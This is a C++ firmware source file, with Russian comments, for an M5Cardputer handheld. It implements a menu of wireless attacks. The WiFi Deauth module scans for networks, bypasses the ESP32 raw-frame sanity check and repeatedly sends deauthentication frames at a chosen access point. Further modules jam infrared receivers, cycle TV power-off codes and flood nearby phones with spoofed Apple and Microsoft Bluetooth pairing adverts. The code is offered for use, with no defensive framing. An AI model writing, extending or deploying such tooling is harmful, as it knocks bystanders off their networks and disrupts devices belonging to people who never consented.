#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <NimBLEDevice.h>

// ═══════════════════════════════════════════
// 1. Процессорный движок
// ═══════════════════════════════════════════
int  current_proc = 1;
bool isSwitching  = true;

struct Process {
  int      procCode;
  void   (*setup)();
  void   (*loop)();
  const char* name;
};

void main_menu_setup();     void main_menu_loop();
void settings_menu_setup(); void settings_menu_loop();
void brightness_setup();    void brightness_loop();
void wifi_deauth_setup();   void wifi_deauth_loop();
void ir_jam_setup();        void ir_jam_loop();
void tvbg_setup();          void tvbg_loop();
void ble_spam_setup();      void ble_spam_loop();

Process processes[] = {
  { 1, main_menu_setup,     main_menu_loop,     "Main Menu"  },
  { 2, settings_menu_setup, settings_menu_loop, "Settings"   },
  { 3, brightness_setup,    brightness_loop,    "Brightness" },
  { 4, wifi_deauth_setup,   wifi_deauth_loop,   "WiFi Deauth"},
  { 5, ir_jam_setup,        ir_jam_loop,        "IR Jammer"  },
  { 6, tvbg_setup,          tvbg_loop,          "TV-B-Gone"  },
  { 7, ble_spam_setup,      ble_spam_loop,      "BLE Spam"   },
};
const int PROCESS_COUNT = sizeof(processes) / sizeof(processes[0]);

// ═══════════════════════════════════════════
// 2. Глобальные переменные
// ═══════════════════════════════════════════
M5Canvas canvas(&M5Cardputer.Display);

int main_menu_cursor = 0;
int settings_cursor  = 0;
int brightness_level = 150;        // 0..255
int batteryLevel     = 100;
uint32_t last_battery_ms = 0;

const char* main_menu_items[] = {
  "Settings", "WiFi Deauth", "IR Jammer", "TV-B-Gone", "BLE Spam", "Exit"
};
const int main_menu_count = 6;

const char* settings_menu_items[] = { "Brightness", "Back" };
const int   settings_menu_count   = 2;

// ─── WiFi Deauth ───
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

const uint8_t deauth_frame_default[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

uint8_t deauth_frame[26];
wifi_ap_record_t scanned_aps[20];
int scanned_count = 0;
int scan_cursor = 0;
int selected_ap_index = -1;
bool deauth_active = false;
uint32_t last_deauth_ms = 0;
bool scan_running = false;

// ─── IR ───
const uint16_t IR_TX_PIN = 44;
IRsend irSender(IR_TX_PIN);

uint32_t last_ir_jam_ms = 0;
uint8_t  ir_jam_step = 0;
const uint16_t jam_freqs[] = { 30000, 33000, 36000, 38000, 40000, 56000 };
const uint8_t  JAM_FREQ_COUNT = 6;

uint32_t last_tvbg_ms = 0;
int      tvbg_index = 0;
const int TVBG_COUNT = 3;   // Samsung, LG, Sony

// ─── BLE ───
bool ble_spam_active = false;
uint32_t last_ble_spam_ms = 0;
uint8_t  ble_spam_mode = 0;
NimBLEAdvertising* pBLEAdvertising = nullptr;

// ═══════════════════════════════════════════
// 3. Проверки клавиш
// ═══════════════════════════════════════════
bool check_next_press() {
  if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
    auto status = M5Cardputer.Keyboard.keysState();
    if (status.fn && status.word.find('.') != status.word.end()) return true;
  }
  return false;
}

bool check_prev_press() {
  if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
    auto status = M5Cardputer.Keyboard.keysState();
    if (status.fn && status.word.find(';') != status.word.end()) return true;
  }
  return false;
}

bool check_select_press() {
  if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
    auto status = M5Cardputer.Keyboard.keysState();
    if (status.enter || status.word.find('/') != status.word.end()) return true;
  }
  return false;
}

bool check_back_press() {
  if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
    auto status = M5Cardputer.Keyboard.keysState();
    if ((status.fn && status.word.find('`') != status.word.end()) || status.esc)
      return true;
  }
  return false;
}

// ═══════════════════════════════════════════
// 4. Батарея + drawmenu
// ═══════════════════════════════════════════
void updateBattery() {
  uint32_t now = millis();
  if (now - last_battery_ms >= 1000) {
    last_battery_ms = now;
    int lvl = M5Cardputer.Power.getBatteryLevel();
    if (lvl >= 0 && lvl <= 100) batteryLevel = lvl;
  }
}

void draw_battery() {
  canvas.setTextColor(WHITE);
  canvas.setCursor(canvas.width() - 40, 6);
  canvas.print(batteryLevel);
  canvas.print("%");
}

void drawmenu(const char* title, const char* items[], int count, int cursor) {
  canvas.fillSprite(BLACK);
  canvas.setTextColor(WHITE);
  canvas.setCursor(6, 6);
  canvas.print(title);

  int startY = 30;
  for (int i = 0; i < count; i++) {
    int y = startY + i * 18;
    if (i == cursor) {
      canvas.fillRect(0, y - 2, canvas.width(), 16, DARKGREY);
      canvas.setTextColor(YELLOW);
    } else {
      canvas.setTextColor(WHITE);
    }
    canvas.setCursor(8, y);
    canvas.print(items[i]);
  }
  updateBattery();
  draw_battery();
}

// ═══════════════════════════════════════════
// 5. Main Menu (1)
// ═══════════════════════════════════════════
void main_menu_setup() {
  main_menu_cursor = 0;
  drawmenu("== Main Menu ==", main_menu_items, main_menu_count, main_menu_cursor);
  canvas.pushSprite(0, 0);
}

void main_menu_loop() {
  if (check_next_press())
    main_menu_cursor = (main_menu_cursor + 1) % main_menu_count;
  if (check_prev_press())
    main_menu_cursor = (main_menu_cursor - 1 + main_menu_count) % main_menu_count;

  if (check_select_press()) {
    switch (main_menu_cursor) {
      case 0: isSwitching = true; current_proc = 2; return;
      case 1: isSwitching = true; current_proc = 4; return;
      case 2: isSwitching = true; current_proc = 5; return;
      case 3: isSwitching = true; current_proc = 6; return;
      case 4: isSwitching = true; current_proc = 7; return;
      case 5: isSwitching = true; current_proc = 1; return;
    }
  }

  drawmenu("== Main Menu ==", main_menu_items, main_menu_count, main_menu_cursor);
  canvas.pushSprite(0, 0);
}

// ═══════════════════════════════════════════
// 6. Settings (2)
// ═══════════════════════════════════════════
void settings_menu_setup() {
  settings_cursor = 0;
  drawmenu("== Settings ==", settings_menu_items, settings_menu_count, settings_cursor);
  canvas.pushSprite(0, 0);
}

void settings_menu_loop() {
  if (check_back_press()) { isSwitching = true; current_proc = 1; return; }
  if (check_next_press()) settings_cursor = (settings_cursor + 1) % settings_menu_count;
  if (check_prev_press()) settings_cursor = (settings_cursor - 1 + settings_menu_count) % settings_menu_count;

  if (check_select_press()) {
    if (settings_cursor == 0) { isSwitching = true; current_proc = 3; return; }
    if (settings_cursor == 1) { isSwitching = true; current_proc = 1; return; }
  }

  drawmenu("== Settings ==", settings_menu_items, settings_menu_count, settings_cursor);
  canvas.pushSprite(0, 0);
}

// ═══════════════════════════════════════════
// 7. Brightness (3)
// ═══════════════════════════════════════════
void brightness_setup() {}

void brightness_loop() {
  if (check_back_press()) { isSwitching = true; current_proc = 2; return; }

  bool changed = false;
  if (check_next_press()) { brightness_level = min(255, brightness_level + 15); changed = true; }
  if (check_prev_press()) { brightness_level = max(10,  brightness_level - 15); changed = true; }
  if (changed) M5Cardputer.Display.setBrightness(brightness_level);

  canvas.fillSprite(BLACK);
  canvas.setTextColor(WHITE);
  canvas.setCursor(6, 6);
  canvas.print("Brightness");
  canvas.setCursor(6, 36);
  canvas.print("Value: ");
  canvas.print(brightness_level);
  canvas.print(" / 255");

  int barX = 6, barY = 60, barW = canvas.width() - 12, barH = 10;
  canvas.drawRect(barX, barY, barW, barH, WHITE);
  int fillW = (barW - 2) * brightness_level / 255;
  if (fillW > 0) canvas.fillRect(barX + 1, barY + 1, fillW, barH - 2, GREEN);

  canvas.setTextColor(LIGHTGREY);
  canvas.setCursor(6, 88);
  canvas.print("Fn+; / Fn+.  +/-");
  canvas.setCursor(6, 104);
  canvas.print("Fn+` back");

  updateBattery();
  draw_battery();
  canvas.pushSprite(0, 0);
}

// ═══════════════════════════════════════════
// 8. WiFi Deauth (4)
// ═══════════════════════════════════════════
void wifi_deauth_setup() {
  scan_cursor = 0;
  selected_ap_index = -1;
  deauth_active = false;
  scanned_count = 0;
  scan_running = true;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.scanDelete();
  WiFi.scanNetworks(true);   // async
}

void wifi_deauth_loop() {
  // Ожидание асинхронного скана (безопасное копирование)
  if (scan_running) {
    int n = WiFi.scanComplete();
    if (n >= 0) {
      scanned_count = min(n, 20);
      for (int i = 0; i < scanned_count; i++) {
        String ssid_str = WiFi.SSID(i);
        strncpy((char*)scanned_aps[i].ssid, ssid_str.c_str(), 32);
        scanned_aps[i].ssid[32] = 0;                         // null-terminator
        scanned_aps[i].rssi    = WiFi.RSSI(i);
        scanned_aps[i].primary = WiFi.channel(i);
        const uint8_t* bssid = WiFi.BSSID(i);
        if (bssid) memcpy(scanned_aps[i].bssid, bssid, 6);
      }
      scan_running = false;
    } else if (n == WIFI_SCAN_FAILED) {
      scanned_count = 0;
      scan_running = false;
    }
  }

  // Навигация по списку
  if (!deauth_active && scanned_count > 0) {
    if (check_next_press()) scan_cursor = (scan_cursor + 1) % scanned_count;
    if (check_prev_press()) scan_cursor = (scan_cursor - 1 + scanned_count) % scanned_count;
  }

  // Выбор цели
  if (!deauth_active && check_select_press() && scanned_count > 0) {
    selected_ap_index = scan_cursor;
    deauth_active = true;
    last_deauth_ms = 0;
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], scanned_aps[selected_ap_index].bssid, 6);
    memcpy(&deauth_frame[16], scanned_aps[selected_ap_index].bssid, 6);
    esp_wifi_set_channel(scanned_aps[selected_ap_index].primary, WIFI_SECOND_CHAN_NONE);
  }

  // Остановка атаки (back при активной атаке)
  if (deauth_active && check_back_press()) {
    deauth_active = false;
    selected_ap_index = -1;
    return;
  }

  // Выход в главное меню (back вне атаки)
  if (!deauth_active && check_back_press()) {
    WiFi.scanDelete();
    isSwitching = true;
    current_proc = 1;
    return;
  }

  // Отправка deauth-пакетов
  if (deauth_active && selected_ap_index >= 0) {
    uint32_t now = millis();
    if (now - last_deauth_ms >= 100) {
      last_deauth_ms = now;
      esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    }
  }

  // Отрисовка
  canvas.fillSprite(BLACK);
  canvas.setTextColor(WHITE);
  canvas.setCursor(4, 4);

  if (scan_running) {
    canvas.print("Scanning WiFi...");
  } else if (scanned_count == 0) {
    canvas.print("No networks found");
    canvas.setCursor(4, 30);
    canvas.setTextColor(LIGHTGREY);
    canvas.print("Fn+` back");
  } else if (!deauth_active) {
    canvas.print("Select target");
    int startY = 24;
    int visible = min(scanned_count, 4);
    int startIdx = max(0, scan_cursor - 1);
    startIdx = min(startIdx, scanned_count - visible);

    for (int i = 0; i < visible; i++) {
      int idx = startIdx + i;
      if (idx >= scanned_count) break;
      int y = startY + i * 18;
      if (idx == scan_cursor) {
        canvas.fillRect(0, y - 2, canvas.width(), 16, DARKGREY);
        canvas.setTextColor(YELLOW);
      } else {
        canvas.setTextColor(WHITE);
      }
      canvas.setCursor(4, y);
      String ssid = String((char*)scanned_aps[idx].ssid);
      if (ssid.length() > 18) ssid = ssid.substring(0, 18);
      canvas.print(ssid);
      canvas.setCursor(canvas.width() - 32, y);
      canvas.print(scanned_aps[idx].rssi);
    }
  } else {
    canvas.print("DEAUTH ACTIVE");
    canvas.setCursor(4, 30);
    canvas.print("Target: ");
    canvas.print((char*)scanned_aps[selected_ap_index].ssid);
    canvas.setCursor(4, 50);
    canvas.print("BSSID: ");
    for (int i = 0; i < 6; i++) {
      canvas.printf("%02X", scanned_aps[selected_ap_index].bssid[i]);
      if (i < 5) canvas.print(":");
    }
    canvas.setCursor(4, 70);
    canvas.print("Ch: ");
    canvas.print(scanned_aps[selected_ap_index].primary);
    canvas.setCursor(4, 100);
    canvas.setTextColor(LIGHTGREY);
    canvas.print("Fn+` to stop");
  }

  updateBattery();
  draw_battery();
  canvas.pushSprite(0, 0);
}

// ═══════════════════════════════════════════
// 9. IR Jammer (5)
// ═══════════════════════════════════════════
void ir_jam_setup() {
  irSender.begin();
  last_ir_jam_ms = 0;
  ir_jam_step = 0;
}

void ir_jam_loop() {
  if (check_back_press()) { isSwitching = true; current_proc = 1; return; }

  uint32_t now = millis();
  if (now - last_ir_jam_ms >= 15) {
    last_ir_jam_ms = now;
    uint16_t freq = jam_freqs[ir_jam_step];
    uint16_t raw[4] = { 80, 80, 80, 80 };
    irSender.sendRaw(raw, 4, freq);
    ir_jam_step = (ir_jam_step + 1) % JAM_FREQ_COUNT;
  }

  canvas.fillSprite(BLACK);
  canvas.setTextColor(WHITE);
  canvas.setCursor(6, 6);
  canvas.print("IR Jammer");
  canvas.setCursor(6, 30);
  canvas.print("Freq: ");
  canvas.print(jam_freqs[ir_jam_step] / 1000);
  canvas.print(" kHz");
  canvas.setCursor(6, 100);
  canvas.setTextColor(LIGHTGREY);
  canvas.print("Fn+` back");

  updateBattery();
  draw_battery();
  canvas.pushSprite(0, 0);
}

// ═══════════════════════════════════════════
// 10. TV-B-Gone (6) — исправлено на 32-битные NEC
// ═══════════════════════════════════════════
void tvbg_setup() {
  irSender.begin();
  last_tvbg_ms = 0;
  tvbg_index = 0;
}

void tvbg_loop() {
  if (check_back_press()) { isSwitching = true; current_proc = 1; return; }

  uint32_t now = millis();
  if (now - last_tvbg_ms >= 2000) {
    last_tvbg_ms = now;

    // Готовые 32-битные POWER-коды (Samsung, LG, Sony)
    if (tvbg_index == 0) {
      irSender.sendNEC(0xE0E040BF, 32);       // Samsung Power
    } else if (tvbg_index == 1) {
      irSender.sendNEC(0x20DF10EF, 32);       // LG Power
    } else if (tvbg_index == 2) {
      irSender.sendSony(0xA90, 12);           // Sony Power (SIRC, 12 бит)
    }

    tvbg_index = (tvbg_index + 1) % TVBG_COUNT;
  }

  canvas.fillSprite(BLACK);
  canvas.setTextColor(WHITE);
  canvas.setCursor(6, 6);
  canvas.print("TV-B-Gone");
  canvas.setCursor(6, 30);
  canvas.print("Code: ");
  canvas.print(tvbg_index + 1);
  canvas.print("/");
  canvas.print(TVBG_COUNT);
  canvas.setCursor(6, 100);
  canvas.setTextColor(LIGHTGREY);
  canvas.print("Fn+` back");

  updateBattery();
  draw_battery();
  canvas.pushSprite(0, 0);
}

// ═══════════════════════════════════════════
// 11. BLE Spam (7)
// ═══════════════════════════════════════════
void ble_spam_setup() {
  NimBLEDevice::init("BLE Spam");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  pBLEAdvertising = NimBLEDevice::getAdvertising();
  pBLEAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
  ble_spam_active = true;
  last_ble_spam_ms = 0;
  ble_spam_mode = 0;
}

void ble_spam_loop() {
  if (check_back_press()) {
    NimBLEDevice::deinit(true);
    pBLEAdvertising = nullptr;
    ble_spam_active = false;
    isSwitching = true;
    current_proc = 1;
    return;
  }

  uint32_t now = millis();
  if (now - last_ble_spam_ms >= 150) {
    last_ble_spam_ms = now;

    // Рандомный MAC
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) mac[i] = esp_random() & 0xFF;
    mac[0] |= 0xF0;
    NimBLEDevice::setOwnAddr(mac);

    NimBLEAdvertisementData advData;
    if (ble_spam_mode == 0) {
      // AppleJuice
      uint8_t apple[] = { 0x02, 0x01, 0x06, 0x1A, 0xFF, 0x4C, 0x00, 0x0E,
                          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
      advData.addData(apple, sizeof(apple));
    } else {
      // SwiftPair
      uint8_t swift[] = { 0x02, 0x01, 0x06, 0x06, 0xFF, 0x06, 0x00, 0x03,
                          0x00, 0x00, 0x00, 0x00 };
      advData.addData(swift, sizeof(swift));
    }

    pBLEAdvertising->stop();
    pBLEAdvertising->setAdvertisementData(advData);
    pBLEAdvertising->start();

    ble_spam_mode = (ble_spam_mode + 1) % 2;
  }

  canvas.fillSprite(BLACK);
  canvas.setTextColor(WHITE);
  canvas.setCursor(6, 6);
  canvas.print("BLE Spam");
  canvas.setCursor(6, 30);
  canvas.print(ble_spam_mode == 0 ? "AppleJuice" : "SwiftPair");
  canvas.setCursor(6, 100);
  canvas.setTextColor(LIGHTGREY);
  canvas.print("Fn+` back");

  updateBattery();
  draw_battery();
  canvas.pushSprite(0, 0);
}

// ═══════════════════════════════════════════
// 12. Диспетчер процессов
// ═══════════════════════════════════════════
Process* findProcess(int code) {
  for (int i = 0; i < PROCESS_COUNT; i++)
    if (processes[i].procCode == code) return &processes[i];
  return &processes[0];
}

void runCurrentSetup() {
  Process* p = findProcess(current_proc);
  if (p->setup) p->setup();
}

void runCurrentLoop() {
  Process* p = findProcess(current_proc);
  if (p->loop) p->loop();
}

// ═══════════════════════════════════════════
// 13. setup / loop
// ═══════════════════════════════════════════
void setup() {
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
  M5Cardputer.Display.setRotation(1);

  canvas.setColorDepth(8);
  canvas.createSprite(M5Cardputer.Display.width(), M5Cardputer.Display.height());
  canvas.setTextWrap(false);
  canvas.setTextSize(1.2);

  M5Cardputer.Display.setBrightness(brightness_level);

  // Первый опрос батареи
  int lvl = M5Cardputer.Power.getBatteryLevel();
  if (lvl >= 0 && lvl <= 100) batteryLevel = lvl;
  last_battery_ms = millis();

  current_proc = 1;
  isSwitching  = true;
}

void loop() {
  M5Cardputer.update();

  if (isSwitching) {
    isSwitching = false;
    runCurrentSetup();
  }

  runCurrentLoop();
}
